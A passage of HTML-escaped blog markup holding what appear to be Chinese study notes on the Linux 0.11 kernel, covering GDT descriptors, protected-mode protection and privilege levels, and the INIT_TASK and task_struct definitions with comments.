class=&#34;line&#34;&gt;gdt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;     ; dummy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x07FF&lt;/span&gt;      ; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;Mb - limit=&lt;span class=&#34;number&#34;&gt;2047&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;2048&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;Mb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;      ; base address=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x9A00&lt;/span&gt;      ; code read/exec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x00C0&lt;/span&gt;      ; granularity=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;386&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x07FF&lt;/span&gt;      ; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;Mb - limit=&lt;span class=&#34;number&#34;&gt;2047&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;2048&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;Mb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;      ; base address=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x9200&lt;/span&gt;      ; data read/write&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .word   &lt;span class=&#34;number&#34;&gt;0x00C0&lt;/span&gt;      ; granularity=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;386&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;6-保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？&#34;&gt;&lt;a href=&#34;#6-保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？&#34; class=&#34;headerlink&#34; title=&#34;6.保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？&#34;&gt;&lt;/a&gt;6.保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？&lt;/h1&gt;&lt;p&gt;p438&lt;/p&gt;
&lt;p&gt;保护模式在保护段,通过段机制划分不同的段,设置各个段的访问权限. 增加了段限长,防止了对代码段的覆盖以及超越权限的访问&lt;/p&gt;
&lt;p&gt;特权级的目的是 阻止非法的访问, 对用户进程之间进行了隔离&lt;/p&gt;
&lt;p&gt;意义是保护了资源&lt;/p&gt;
&lt;p&gt;分页有保护作用,分页使得用户无法直接找到物理地址,用户只能操作逻辑地址,而逻辑地址需要先转化为线性地址,然后才能进一步转化为物理地址&lt;/p&gt;
&lt;h1 id=&#34;7-在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？&#34;&gt;&lt;a href=&#34;#7-在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？&#34; class=&#34;headerlink&#34; title=&#34;7.在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？&#34;&gt;&lt;/a&gt;7.在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？&lt;/h1&gt;&lt;p&gt;p33&lt;/p&gt;
&lt;p&gt;因为第一次设置GDT是在setup.s里面设置的数据,setup.s将来会在设计缓冲区时被覆盖,所以需要改变位置. 其实这是设计者精心打磨内存使用空间而产生的后果,尽可能不浪费一点空间,head.s执行时,gdt又被写到了head.s执行过的程序中,实现了内存的充分利用.&lt;/p&gt;
&lt;h1 id=&#34;8-进程0的task-struct在哪？具体内容是什么？&#34;&gt;&lt;a href=&#34;#8-进程0的task-struct在哪？具体内容是什么？&#34; class=&#34;headerlink&#34; title=&#34;8.进程0的task_struct在哪？具体内容是什么？&#34;&gt;&lt;/a&gt;8.进程0的task_struct在哪？具体内容是什么？&lt;/h1&gt;&lt;h2 id=&#34;在哪&#34;&gt;&lt;a href=&#34;#在哪&#34; class=&#34;headerlink&#34; title=&#34;在哪?&#34;&gt;&lt;/a&gt;在哪?&lt;/h2&gt;&lt;p&gt;include&amp;#x2F;linux&amp;#x2F;sched.h 是写死的,在INIT_ TASK里,运行时位于内核数据区&lt;/p&gt;
&lt;p&gt;在未初始化进程0之前,使用的是boot阶段的内核栈(user_stack) 很奇怪吧,内核栈却叫user_stack,p34&lt;/p&gt;
&lt;h2 id=&#34;具体内容&#34;&gt;&lt;a href=&#34;#具体内容&#34; class=&#34;headerlink&#34; title=&#34;具体内容?&#34;&gt;&lt;/a&gt;具体内容?&lt;/h2&gt;&lt;p&gt;包含了进程各项初始化的内容,具体的话可以看task_struct,附在下面了. (include&amp;#x2F;linux&amp;#x2F;sched.h )&lt;/p&gt;
&lt;p&gt;如:进程0的进程状态,LDT,TSS等 p68&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *  INIT_TASK is used to set up the first task table, touch at&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * your own risk!. Base=0, limit=0x9ffff (=640kB)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;         &lt;span class=&#34;comment&#34;&gt;// 下面的就是进程0的各个参数的具体值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; INIT_TASK \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* state etc */&lt;/span&gt;	&amp;#123; 0,15,15, \   &lt;span class=&#34;comment&#34;&gt;// 0是说可以跑,而不是正在跑 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* signals */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&amp;#123;&amp;#123;&amp;#125;,&amp;#125;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* ec,brk... */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* pid etc.. */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* uid etc */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* alarm */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* math */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* fs info */&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0022&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* filp */&lt;/span&gt;	&amp;#123;&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;,&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* ldt */&lt;/span&gt;	&amp;#123;&lt;span class=&#34;number&#34;&gt;0x9f&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xc0fa00&lt;/span&gt;&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;span class=&#34;number&#34;&gt;0x9f&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xc0f200&lt;/span&gt;&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*tss*/&lt;/span&gt;	&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,PAGE_SIZE+(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)&amp;amp;init_task,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)&amp;amp;pg_dir,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 _LDT(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;0x80000000&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&amp;#125; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;task_struct&lt;/span&gt; &amp;#123;&lt;/span&gt;          &lt;span class=&#34;comment&#34;&gt;// 非常非常非常重要,操作系统里最核心的东西&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* these are hardcoded - don&amp;#x27;t touch */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; state;	&lt;span class=&#34;comment&#34;&gt;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; counter;  &lt;span class=&#34;comment&#34;&gt;//时间片 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; priority;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; signal;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sigaction&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sigaction&lt;/span&gt;[32];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; blocked;	&lt;span class=&#34;comment&#34;&gt;/* bitmap of masked signals */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* various fields */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; exit_code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; start_code,end_code,end_data,brk,start_stack;  &lt;span class=&#34;comment&#34;&gt;//malloc从这里划&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; pid,father,pgrp,session,leader;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; uid,euid,suid;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; gid,egid,sgid;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; alarm;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; utime,stime,cutime,cstime,start_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; used_math;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* file system info */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tty;		&lt;span class=&#34;comment&#34;&gt;/* -1 if no tty, so it must be signed */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; umask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;m_inode&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;pwd&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;m_inode&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;root&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;m_inode&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;executable&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; close_on_exec;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;file&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;filp&lt;/span&gt;[&lt;span class=&#34;title&#34;&gt;NR_OPEN&lt;/span&gt;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;amp;ss */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;desc_struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ldt&lt;/span&gt;[3];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* tss for this task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tss_struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tss&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;9-内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。&#34;&gt;&lt;a href=&#34;#9-内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;9.内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。&#34;&gt;&lt;/a&gt;9.内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。&lt;/h1&gt;&lt;p&gt;p37 &lt;/p&gt;
&lt;p&gt;赵炯p438&lt;/p&gt;
&lt;p&gt;注意是线性地址空间,线性地址空间远大于物理地址空间,线性地址空间是 64k * 64k &amp;#x3D; 4G。 0xFFFFFF 2的32次方&lt;/p&gt;
&lt;h2 id=&#34;分页&#34;&gt;&lt;a href=&#34;#分页&#34; class=&#34;headerlink&#34; title=&#34;分页&#34;&gt;&lt;/a&gt;分页&lt;/h2&gt;&lt;p&gt;4k大小为一页&lt;/p&gt;
&lt;p&gt;setup_paging开始&lt;/p&gt;
&lt;p&gt;第一页是页目录表,随后的4个页表是内核专属的页表&lt;/p&gt;
&lt;p&gt;分别代表什么呢? 第一个是不是gdt?? gdt在哪??&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 